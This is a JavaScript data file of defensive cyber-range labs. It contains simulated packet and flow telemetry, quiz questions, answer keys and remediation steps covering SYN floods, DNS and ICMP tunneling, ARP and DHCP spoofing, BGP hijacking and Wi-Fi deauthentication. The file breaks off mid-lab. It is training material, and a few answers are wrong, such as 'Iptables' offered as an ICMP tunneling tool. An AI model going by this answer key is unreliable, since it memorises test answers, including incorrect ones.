// CYBER DEFENSE ACADEMY - 105+ TACTICAL PRACTICAL LABS DATASET
// Complete hands-on cyber defense, forensics, network, web, and cloud range
// Every lab features >5 questions, realistic telemetry, hints, and remediation guides.

export const TACTICAL_LABS_DATA = [
  {
    "id": "lab-net-001",
    "category": "Network Forensics & Wireshark",
    "title": "Wireshark TCP 3-Way Handshake & SYN Flood Analysis",
    "difficulty": "Beginner",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Tactical edge sensors alerted on anomalous half-open connection spikes targeting edge web nodes. Analyze the captured PCAP trace showing thousands of SYN packets without ACK completion, identify target ports, and formulate mitigation.",
    "telemetry": "Frame 1: 198.51.100.22:49152 -> 10.0.0.5:80 TCP 66 [SYN] Seq=0 Win=1024 Len=0\nFrame 2: 198.51.100.23:49153 -> 10.0.0.5:80 TCP 66 [SYN] Seq=0 Win=1024 Len=0\nFrame 3: 10.0.0.5:80 -> 198.51.100.22:49152 TCP 66 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0\nFrame 4: [TCP Retransmission] 10.0.0.5:80 -> 198.51.100.22:49152 [SYN, ACK]\nStatus: Backlog queue 100% saturated on target 10.0.0.5:80. Server dropping valid connections.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What specific TCP flag initiates the standard 3-way connection handshake?",
        "expected": "SYN",
        "acceptedKeywords": [
          "SYN",
          "synchronize"
        ],
        "hint": "First packet sent by the connecting client.",
        "explanation": "Expected: SYN. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What dual-flag response does the server transmit upon receiving the initial connection request?",
        "expected": "SYN-ACK",
        "acceptedKeywords": [
          "SYN-ACK",
          "SYN, ACK",
          "SYN ACK"
        ],
        "hint": "Both synchronization and acknowledgment flags.",
        "explanation": "Expected: SYN-ACK. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What destination port on 10.0.0.5 is the adversary flooding with spoofed requests?",
        "expected": "80",
        "acceptedKeywords": [
          "80",
          "HTTP",
          "port 80"
        ],
        "hint": "Standard unencrypted web service port.",
        "explanation": "Expected: 80. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What kernel defense mechanism computes sequence numbers cryptographically to avoid memory allocation?",
        "expected": "SYN Cookies",
        "acceptedKeywords": [
          "SYN Cookies",
          "syncookies",
          "tcp_syncookies"
        ],
        "hint": "Linux feature net.ipv4.tcp_syncookies.",
        "explanation": "Expected: SYN Cookies. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. Which Linux socket status represents a connection waiting for the final client ACK?",
        "expected": "SYN_RECV",
        "acceptedKeywords": [
          "SYN_RECV",
          "SYN-RECEIVED",
          "SYN_RECEIVED"
        ],
        "hint": "State shown in netstat / ss output.",
        "explanation": "Expected: SYN_RECV. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What command inspects socket statistics and filters for connection states in modern Linux?",
        "expected": "ss -ant",
        "acceptedKeywords": [
          "ss",
          "netstat",
          "ss -ant",
          "netstat -ant"
        ],
        "hint": "Fast modern replacement for netstat.",
        "explanation": "Expected: ss -ant. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Enable net.ipv4.tcp_syncookies=1, lower tcp_synack_retries to 2, and deploy iptables synproxy or cloud scrubbing."
  },
  {
    "id": "lab-net-002",
    "category": "Network Forensics & Wireshark",
    "title": "DNS Tunneling & Base64 Data Exfiltration Detection",
    "difficulty": "Intermediate",
    "timeEst": "18 min",
    "xpReward": 180,
    "briefing": "Internal perimeter firewalls reported unusually high volume of TXT record DNS requests originating from a workstation in engineering. Decode the exfiltrated telemetry and determine the C2 domain.",
    "telemetry": "14:10:01 10.10.4.15:53210 -> 1.1.1.1:53 DNS Query: TXT dXNlcm5hbWU9YWRtaW4=.c2-telemetry.ru\n14:10:02 10.10.4.15:53211 -> 1.1.1.1:53 DNS Query: TXT cGFzc3dvcmQ9U2VjdXJlITEx.c2-telemetry.ru\n14:10:03 10.10.4.15:53212 -> 1.1.1.1:53 DNS Query: TXT aG9zdD1XUktTVEFUSU9OMDE=.c2-telemetry.ru\nEncoded Base64 Payload 1: dXNlcm5hbWU9YWRtaW4= -> username=admin\nEncoded Base64 Payload 2: cGFzc3dvcmQ9U2VjdXJlITEx -> password=Secure!11",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What protocol is being abused for covert data exfiltration and C2 beaconing?",
        "expected": "DNS",
        "acceptedKeywords": [
          "DNS",
          "Domain Name System"
        ],
        "hint": "Port 53 query protocol.",
        "explanation": "Expected: DNS. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. Which DNS record type is commonly exploited due to its high text payload capacity?",
        "expected": "TXT",
        "acceptedKeywords": [
          "TXT",
          "TXT record"
        ],
        "hint": "DNS record used for text attributes and SPF.",
        "explanation": "Expected: TXT. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What external root domain is receiving the exfiltrated sensitive cadet telemetry?",
        "expected": "c2-telemetry.ru",
        "acceptedKeywords": [
          "c2-telemetry.ru"
        ],
        "hint": "Examine the authoritative domain suffix.",
        "explanation": "Expected: c2-telemetry.ru. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What internal IP address has been compromised and is acting as the beacon source?",
        "expected": "10.10.4.15",
        "acceptedKeywords": [
          "10.10.4.15"
        ],
        "hint": "Source IP in the query telemetry.",
        "explanation": "Expected: 10.10.4.15. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What encoding format did the adversary use to disguise the stolen credential strings?",
        "expected": "Base64",
        "acceptedKeywords": [
          "Base64",
          "base 64"
        ],
        "hint": "Common 64-character alphabet ending in padding =.",
        "explanation": "Expected: Base64. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What defensive capability drops queries to known malicious domains at the resolver level?",
        "expected": "DNS Sinkhole",
        "acceptedKeywords": [
          "DNS Sinkhole",
          "RPZ",
          "Sinkholing",
          "DNS Sinkholing"
        ],
        "hint": "Routing malicious domains to a blackhole or quarantine IP.",
        "explanation": "Expected: DNS Sinkhole. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Implement Response Policy Zones (RPZ) on internal DNS resolvers, restrict port 53 outbound to authorized corporate DNS servers only, and isolate host 10.10.4.15."
  },
  {
    "id": "lab-net-003",
    "category": "Network Forensics & Wireshark",
    "title": "ARP Cache Poisoning & Man-in-the-Middle (MitM) Hunt",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 160,
    "briefing": "Cadets in the lab reported intermittent TLS certificate warnings. PCAP analysis shows gratuitous ARP replies mapping two distinct IP addresses to a single MAC address.",
    "telemetry": "ARP Announcement: 192.168.1.1 is at 00:0c:29:ab:cd:ef (Gateway)\nARP Gratuitous:   192.168.1.1 is at 00:0c:29:11:22:33 (Attacker MAC)\nARP Gratuitous:   192.168.1.50 is at 00:0c:29:11:22:33 (Attacker MAC)\nVictim ARP Cache:\n  Internet Address      Physical Address      Type\n  192.168.1.1           00-0c-29-11-22-33     dynamic (POISONED)\n  192.168.1.50          00-0c-29-11-22-33     dynamic (ATTACKER)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What physical hardware address (MAC) is executing the ARP poisoning spoof?",
        "expected": "00:0c:29:11:22:33",
        "acceptedKeywords": [
          "00:0c:29:11:22:33",
          "00-0c-29-11-22-33"
        ],
        "hint": "The duplicated MAC claiming both IP identities.",
        "explanation": "Expected: 00:0c:29:11:22:33. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What is the valid IP address of the local network default gateway?",
        "expected": "192.168.1.1",
        "acceptedKeywords": [
          "192.168.1.1"
        ],
        "hint": "First address in the 192.168.1.0/24 subnet.",
        "explanation": "Expected: 192.168.1.1. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What enterprise switch security feature inspects ARP packets against DHCP snooping binding tables?",
        "expected": "Dynamic ARP Inspection",
        "acceptedKeywords": [
          "Dynamic ARP Inspection",
          "DAI"
        ],
        "hint": "Commonly known as DAI on Cisco switches.",
        "explanation": "Expected: Dynamic ARP Inspection. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What ARP packet type does the attacker continuously broadcast to overwrite victim caches?",
        "expected": "Gratuitous ARP",
        "acceptedKeywords": [
          "Gratuitous ARP",
          "gratuitous",
          "GARP"
        ],
        "hint": "Unsolicited ARP response.",
        "explanation": "Expected: Gratuitous ARP. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. Which command displays the local ARP table on Windows and Linux workstations?",
        "expected": "arp -a",
        "acceptedKeywords": [
          "arp -a",
          "arp -n",
          "ip neigh"
        ],
        "hint": "Standard command with -a parameter.",
        "explanation": "Expected: arp -a. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What attack objective is enabled once the adversary successfully intercepts Layer 2 traffic?",
        "expected": "Man-in-the-Middle",
        "acceptedKeywords": [
          "Man-in-the-Middle",
          "MitM",
          "sniffing",
          "eavesdropping"
        ],
        "hint": "Positioning between the victim and gateway.",
        "explanation": "Expected: Man-in-the-Middle. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Enable Dynamic ARP Inspection (DAI) and DHCP Snooping on access switch trunks, and configure static ARP entries for critical infrastructure."
  },
  {
    "id": "lab-net-004",
    "category": "Network Forensics & Wireshark",
    "title": "Rogue DHCP Server & Default Gateway Redirection",
    "difficulty": "Intermediate",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Workstations in division headquarters began receiving IP addresses in an unauthorized 172.16.99.0/24 subnet. Analyze the DHCP Offer packets and trace the rogue server.",
    "telemetry": "DHCP Discover: Client 00:1a:2b:3c:4d:5e broadcasts on 255.255.255.255:67\nDHCP Offer [Legitimate]: Server 10.0.0.1 -> Offering 10.0.0.145, GW: 10.0.0.1, DNS: 10.0.0.2\nDHCP Offer [ROGUE]:      Server 172.16.99.1 (MAC 02:42:ac:11:00:02) -> Offering 172.16.99.100, GW: 172.16.99.1, DNS: 172.16.99.1\nResult: Rogue offer arrived 4ms faster; client accepted rogue configuration.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What is the IP address of the rogue rogue DHCP server attempting to hijack clients?",
        "expected": "172.16.99.1",
        "acceptedKeywords": [
          "172.16.99.1"
        ],
        "hint": "Server IP offering the unauthorized subnet.",
        "explanation": "Expected: 172.16.99.1. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What UDP port does a DHCP client listen on for incoming Offer and Ack packets?",
        "expected": "68",
        "acceptedKeywords": [
          "68",
          "UDP 68",
          "port 68"
        ],
        "hint": "DHCP server is 67, client is 68.",
        "explanation": "Expected: 68. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What switch feature prevents rogue DHCP servers by designating trusted and untrusted switchports?",
        "expected": "DHCP Snooping",
        "acceptedKeywords": [
          "DHCP Snooping",
          "snooping"
        ],
        "hint": "Layer 2 security feature on managed switches.",
        "explanation": "Expected: DHCP Snooping. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What was the legitimate IP gateway offered by the authorized server 10.0.0.1?",
        "expected": "10.0.0.1",
        "acceptedKeywords": [
          "10.0.0.1"
        ],
        "hint": "Gateway address in legitimate offer.",
        "explanation": "Expected: 10.0.0.1. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What MAC address belongs to the hostile rogue DHCP device?",
        "expected": "02:42:ac:11:00:02",
        "acceptedKeywords": [
          "02:42:ac:11:00:02"
        ],
        "hint": "Hardware MAC listed in rogue packet.",
        "explanation": "Expected: 02:42:ac:11:00:02. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What command releases and requests a new DHCP lease on Windows endpoints?",
        "expected": "ipconfig /renew",
        "acceptedKeywords": [
          "ipconfig /renew",
          "ipconfig /release"
        ],
        "hint": "Windows ipconfig switch.",
        "explanation": "Expected: ipconfig /renew. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Configure DHCP Snooping globally on Cisco/Arista switches, mark all client access ports as untrusted, and trace switchport MAC 02:42:ac:11:00:02 to disable physical port."
  },
  {
    "id": "lab-net-005",
    "category": "Network Forensics & Wireshark",
    "title": "Wireshark TLS SNI & Certificate Fingerprinting",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Adversaries utilize HTTPS to encrypt C2 communication. Although payload bytes are encrypted, the initial TLS Client Hello and Server Certificate reveal target infrastructure. Triage the handshake.",
    "telemetry": "Frame 44: TLSv1.3 Client Hello:\n  Server Name Indication (SNI): c2-node-99.darknet-nexus.org\n  Supported Ciphers: TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256\nFrame 46: TLSv1.3 Server Hello:\n  Cipher Suite: TLS_AES_256_GCM_SHA384\nFrame 48: Certificate:\n  Subject: CN=c2-node-99.darknet-nexus.org\n  Issuer: CN=Let's Encrypt Authority X3\n  JA3 Fingerprint: e7d705a3286e19ea42f587b344ee6865",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What hostname was transmitted in cleartext within the TLS Client Hello SNI field?",
        "expected": "c2-node-99.darknet-nexus.org",
        "acceptedKeywords": [
          "c2-node-99.darknet-nexus.org"
        ],
        "hint": "Server Name Indication domain.",
        "explanation": "Expected: c2-node-99.darknet-nexus.org. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What TLS version was negotiated between the victim endpoint and the C2 node?",
        "expected": "TLSv1.3",
        "acceptedKeywords": [
          "TLSv1.3",
          "TLS 1.3",
          "1.3"
        ],
        "hint": "Latest transport layer security standard.",
        "explanation": "Expected: TLSv1.3. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What cryptographic fingerprinting method fingerprints TLS client handshake parameters (ciphers, extensions)?",
        "expected": "JA3",
        "acceptedKeywords": [
          "JA3",
          "JA3 Fingerprint",
          "JA3S"
        ],
        "hint": "Salesforce developed TLS hash technique.",
        "explanation": "Expected: JA3. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What Certificate Authority issued the SSL/TLS certificate for the C2 node?",
        "expected": "Let's Encrypt",
        "acceptedKeywords": [
          "Let's Encrypt",
          "Lets Encrypt",
          "Let's Encrypt Authority X3"
        ],
        "hint": "Free automated certificate provider.",
        "explanation": "Expected: Let's Encrypt. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. Which cipher suite was selected by the server in Frame 46?",
        "expected": "TLS_AES_256_GCM_SHA384",
        "acceptedKeywords": [
          "TLS_AES_256_GCM_SHA384",
          "AES_256_GCM"
        ],
        "hint": "Full cipher suite name in Server Hello.",
        "explanation": "Expected: TLS_AES_256_GCM_SHA384. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What standard port is used for secure encrypted HTTPS communications?",
        "expected": "443",
        "acceptedKeywords": [
          "443",
          "TCP 443"
        ],
        "hint": "Default HTTPS port.",
        "explanation": "Expected: 443. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Add c2-node-99.darknet-nexus.org to perimeter SSL decryption proxy blocklists and alert on JA3 fingerprint hash e7d705a3286e19ea42f587b344ee6865 across Zeek logs."
  },
  {
    "id": "lab-net-006",
    "category": "Network Forensics & Wireshark",
    "title": "ICMP Tunneling & Covert Data Channel Forensics",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 200,
    "briefing": "Network behavioral analytics identified anomalous ICMP Echo Request packets with unusually large payload sizes (1400 bytes) sent at regular 500ms intervals.",
    "telemetry": "Packet 1: ICMP Echo Request | 192.168.10.88 -> 203.0.113.77 | Type 8 Code 0 | Len=1428\nData payload hex: 50 4b 03 04 14 00 00 00 08 00 ... [ASCII: PK..........secret_cadet_plans.docx]\nPacket 2: ICMP Echo Reply   | 203.0.113.77 -> 192.168.10.88 | Type 0 Code 0 | Len=1428\nNormal ICMP Echo payload size: 32 bytes (Windows) or 64 bytes (Linux).\nSuspicious Activity: Over 50MB exfiltrated over ICMP protocol within 30 minutes.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What ICMP message Type indicates an Echo Request packet?",
        "expected": "8",
        "acceptedKeywords": [
          "8",
          "Type 8"
        ],
        "hint": "ICMP type number for ping request.",
        "explanation": "Expected: 8. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What ICMP message Type indicates the corresponding Echo Reply packet?",
        "expected": "0",
        "acceptedKeywords": [
          "0",
          "Type 0"
        ],
        "hint": "ICMP type number for ping response.",
        "explanation": "Expected: 0. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What famous file signature / magic bytes \"50 4b 03 04\" (PK..) indicate in the payload?",
        "expected": "ZIP",
        "acceptedKeywords": [
          "ZIP",
          "Office",
          "DOCX",
          "PKZip"
        ],
        "hint": "Archive format header used in .zip and Microsoft Office .docx files.",
        "explanation": "Expected: ZIP. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What filename was extracted from the covert ICMP exfiltration stream?",
        "expected": "secret_cadet_plans.docx",
        "acceptedKeywords": [
          "secret_cadet_plans.docx"
        ],
        "hint": "Filename visible in ASCII payload string.",
        "explanation": "Expected: secret_cadet_plans.docx. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What external hostile IP address received the encapsulated ICMP data packets?",
        "expected": "203.0.113.77",
        "acceptedKeywords": [
          "203.0.113.77"
        ],
        "hint": "Destination IP address in telemetry.",
        "explanation": "Expected: 203.0.113.77. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What popular open-source tool enables data encapsulation inside ICMP packets?",
        "expected": "Iptables or Ptunnel",
        "acceptedKeywords": [
          "Ptunnel",
          "IcmpTunnel",
          "Ipscan",
          "Hans"
        ],
        "hint": "Ptunnel or Icmptunnel.",
        "explanation": "Expected: Iptables or Ptunnel. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Configure edge firewalls to inspect ICMP payload sizes and drop any Echo packets exceeding 64 bytes, and block outbound ICMP to non-whitelisted destinations."
  },
  {
    "id": "lab-net-007",
    "category": "Network Forensics & Wireshark",
    "title": "HTTP Digest & Cleartext Credential Extraction",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 120,
    "briefing": "Cadets conducted an unencrypted login to an internal legacy management portal. Analyze the captured HTTP POST stream, extract credentials, and verify security headers.",
    "telemetry": "POST /api/v1/auth/login HTTP/1.1\nHost: internal-portal.tactical.mil\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 48\n\ncadet_id=cadet.verma&auth_token=T@ct1calP@ss2026!\n\nHTTP/1.1 200 OK\nSet-Cookie: session_id=f4892c90e81729b1; Path=/;\nServer: Apache/2.4.41 (Ubuntu)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What username was transmitted in plaintext within the POST payload?",
        "expected": "cadet.verma",
        "acceptedKeywords": [
          "cadet.verma"
        ],
        "hint": "cadet_id parameter value.",
        "explanation": "Expected: cadet.verma. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What cleartext password/token was captured in the unencrypted transmission?",
        "expected": "T@ct1calP@ss2026!",
        "acceptedKeywords": [
          "T@ct1calP@ss2026!"
        ],
        "hint": "auth_token parameter value.",
        "explanation": "Expected: T@ct1calP@ss2026!. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What crucial cookie security flag is missing from the Set-Cookie response header?",
        "expected": "HttpOnly",
        "acceptedKeywords": [
          "HttpOnly",
          "Secure",
          "SameSite"
        ],
        "hint": "Prevents client-side JavaScript from accessing cookies.",
        "explanation": "Expected: HttpOnly. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What flag ensures cookies are only transmitted over HTTPS encrypted connections?",
        "expected": "Secure",
        "acceptedKeywords": [
          "Secure",
          "Secure flag"
        ],
        "hint": "Cookie attribute for HTTPS only.",
        "explanation": "Expected: Secure. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What HTTP method was utilized to submit the authentication payload?",
        "expected": "POST",
        "acceptedKeywords": [
          "POST"
        ],
        "hint": "Standard HTTP method for form submission.",
        "explanation": "Expected: POST. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What response status code indicates successful authentication in this trace?",
        "expected": "200",
        "acceptedKeywords": [
          "200",
          "200 OK"
        ],
        "hint": "Standard success status code.",
        "explanation": "Expected: 200. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Enforce HTTPS everywhere with HTTP Strict Transport Security (HSTS), and append \"HttpOnly; Secure; SameSite=Strict\" to all session cookies."
  },
  {
    "id": "lab-net-008",
    "category": "Network Forensics & Wireshark",
    "title": "BGP Route Hijacking & Prefix Anomaly Detection",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 220,
    "briefing": "Global telemetry reported that traffic intended for a defense subnet (198.51.100.0/24) was diverted through an unauthorized autonomous system in an adversarial nation.",
    "telemetry": "BGP Update Message:\n  Withdrawn Routes Length: 0\n  Path Attribute: ORIGIN: IGP\n  Path Attribute: AS_PATH: 4812 12389 64496 (Legitimate AS Path)\n  Network Layer Reachability Information (NLRI): 198.51.100.0/22\n\nHostile BGP Announcement:\n  Path Attribute: AS_PATH: 17557 64496\n  Network Layer Reachability Information (NLRI): 198.51.100.0/24 (More Specific Prefix!)\nResult: Internet routers prefer more specific /24 prefix over legitimate /22 announcement.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. Why did global internet routers prefer the hostile route over the legitimate announcement?",
        "expected": "More specific prefix",
        "acceptedKeywords": [
          "More specific prefix",
          "Longest prefix match",
          "/24",
          "more specific"
        ],
        "hint": "Routers always prioritize longer prefix masks (/24 over /22).",
        "explanation": "Expected: More specific prefix. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What routing protocol is the fundamental routing foundation of the global internet?",
        "expected": "BGP",
        "acceptedKeywords": [
          "BGP",
          "Border Gateway Protocol"
        ],
        "hint": "Border Gateway Protocol.",
        "explanation": "Expected: BGP. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What autonomous system number (ASN) announced the rogue prefix?",
        "expected": "17557",
        "acceptedKeywords": [
          "17557",
          "AS17557",
          "AS 17557"
        ],
        "hint": "First ASN in the hostile AS_PATH.",
        "explanation": "Expected: 17557. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. What cryptographic validation framework prevents unauthorized AS announcements?",
        "expected": "RPKI",
        "acceptedKeywords": [
          "RPKI",
          "Resource Public Key Infrastructure",
          "ROA"
        ],
        "hint": "Resource Public Key Infrastructure using Route Origin Authorizations.",
        "explanation": "Expected: RPKI. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What prefix length was announced in the unauthorized hijacking route?",
        "expected": "/24",
        "acceptedKeywords": [
          "/24",
          "24"
        ],
        "hint": "Prefix mask in hostile announcement.",
        "explanation": "Expected: /24. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What object signed in RPKI binds a prefix to an authorized ASN?",
        "expected": "ROA",
        "acceptedKeywords": [
          "ROA",
          "Route Origin Authorization"
        ],
        "hint": "Route Origin Authorization.",
        "explanation": "Expected: ROA. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Publish Route Origin Authorizations (ROAs) in regional internet registries (ARIN/RIPE/APNIC) and enforce RPKI Route Origin Validation (ROV) on tier-1 ISP transit links."
  },
  {
    "id": "lab-net-009",
    "category": "Network Forensics & Wireshark",
    "title": "NetFlow & IPFIX Anomaly Hunting for Data Exfiltration",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Analyze NetFlow v9 records from the core router to detect after-hours bulk data transfer from the research fileserver to an overseas IP.",
    "telemetry": "Flow 1: 2026-09-28 02:14:10 | Src: 10.200.5.50:445 -> Dst: 10.200.5.12:49811 | Packets: 120 | Bytes: 15 KB\nFlow 2: 2026-09-28 02:30:05 | Src: 10.200.5.50:52110 -> Dst: 198.51.100.99:22 | Packets: 8,450,120 | Bytes: 11.2 GB\nFlow 3: 2026-09-28 03:00:12 | Src: 10.200.5.50:52115 -> Dst: 198.51.100.99:22 | Packets: 4,110,000 | Bytes: 5.6 GB\nAlert: Workstation 10.200.5.50 transferred 16.8GB outbound to external IP 198.51.100.99 over port 22 between 02:00 and 03:30 AM.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What internal IP address initiated the massive outbound data transfer?",
        "expected": "10.200.5.50",
        "acceptedKeywords": [
          "10.200.5.50"
        ],
        "hint": "Source IP in flows 2 and 3.",
        "explanation": "Expected: 10.200.5.50. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. What destination port was utilized on external host 198.51.100.99?",
        "expected": "22",
        "acceptedKeywords": [
          "22",
          "SSH",
          "SFTP"
        ],
        "hint": "Standard secure shell / SFTP port.",
        "explanation": "Expected: 22. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. Approximately how many gigabytes of data were exfiltrated in Flow 2 and Flow 3 combined?",
        "expected": "16.8",
        "acceptedKeywords": [
          "16.8",
          "16.8 GB",
          "17 GB",
          "16.8GB"
        ],
        "hint": "11.2 GB + 5.6 GB.",
        "explanation": "Expected: 16.8. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t4",
        "prompt": "4. At what time of day (local 24h format) did this anomalous exfiltration occur?",
        "expected": "02:30",
        "acceptedKeywords": [
          "02:30",
          "02:00",
          "night",
          "after-hours"
        ],
        "hint": "Timestamp in flow records.",
        "explanation": "Expected: 02:30. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t5",
        "prompt": "5. What flow standard developed by IETF is the successor to Cisco NetFlow v9?",
        "expected": "IPFIX",
        "acceptedKeywords": [
          "IPFIX",
          "IP Flow Information Export"
        ],
        "hint": "IP Flow Information Export (RFC 7011).",
        "explanation": "Expected: IPFIX. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t6",
        "prompt": "6. What external IP received the unauthorized data payload?",
        "expected": "198.51.100.99",
        "acceptedKeywords": [
          "198.51.100.99"
        ],
        "hint": "Destination address in telemetry.",
        "explanation": "Expected: 198.51.100.99. Concept: Verified through protocol standards and tactical incident analysis."
      }
    ],
    "remediationGuide": "Quarantine host 10.200.5.50, terminate active SSH sessions on firewall, block IP 198.51.100.99, and audit access logs on file server."
  },
  {
    "id": "lab-net-010",
    "category": "Network Forensics & Wireshark",
    "title": "Wi-Fi 4-Way Handshake EAPOL & Deauthentication Analysis",
    "difficulty": "Intermediate",
    "timeEst": "18 min",
    "xpReward": 170,
    "briefing": "Campus wireless security monitoring flagged rapid disconnections among leadership devices followed by broadcast 802.11 management frames. Analyze the EAPOL capture.",
    "telemetry": "Frame 1: 802.11 Deauth | AP: 00:14:6c:7e:40:80 -> Client: f4:5c:89:12:34:56 | Reason: 7 (Class 3 frame received from nonassociated STA)\nFrame 2: 802.11 Deauth | AP: 00:14:6c:7e:40:80 -> Client: f4:5c:89:12:34:56 | Reason: 7\nFrame 3: EAPOL Key (Message 1 of 4) | AP -> Client | ANonce: a1b2c3d4...\nFrame 4: EAPOL Key (Message 2 of 4) | Client -> AP | SNonce: e5f6a7b8... MIC: 9912aa...\nFrame 5: EAPOL Key (Message 3 of 4) | AP -> Client | Install=1\nFrame 6: EAPOL Key (Message 4 of 4) | Client -> AP",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What malicious 802.11 management frame was injected to force the victim client offline?",
        "expected": "Deauthentication",
        "acceptedKeywords": [
          "Deauthentication",
          "Deauth",
          "Disassociation"
        ],
        "hint": "Frame 1 type in trace.",
        "explanation": "Expected: Deauthentication. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t2",
        "prompt": "2. How many messages make up the standard WPA2/WPA3 key establishment handshake?",
        "expected": "4",
        "acceptedKeywords": [
          "4",
          "four",
          "4-way"
        ],
        "hint": "Known as the 4-way handshake.",
        "explanation": "Expected: 4. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
        "id": "t3",
        "prompt": "3. What protocol is used to exchange cryptographic keys in the wireless handshake?",
        "expected": "EAPOL",
        "acceptedKeywords": [
          "EAPOL",
          "EAP over LAN"
        ],
        "hint": "Extensible Authentication Protocol over LAN.",
        "explanation": "Expected: EAPOL. Concept: Verified through protocol standards and tactical incident analysis."
      },
      {
